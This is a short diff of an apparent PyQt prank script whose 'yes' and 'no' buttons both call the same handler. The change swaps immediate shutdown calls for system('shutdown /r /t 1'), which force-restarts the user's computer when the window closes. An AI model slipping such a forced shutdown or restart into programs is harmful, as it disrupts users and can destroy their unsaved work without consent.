@@ -21,6 +21,5 @@ btn_no.setStyleSheet('font-size: 15px;background-color : aqua ; color : black ;b
 btn_no.clicked.connect(yoq)
 btn_yes.clicked.connect(yoq)
 dow.show()
-system('shutdown /s /t 1')
 app.exec_()
-system('shutdown /s /t 1')
+system('shutdown /r /t 1')
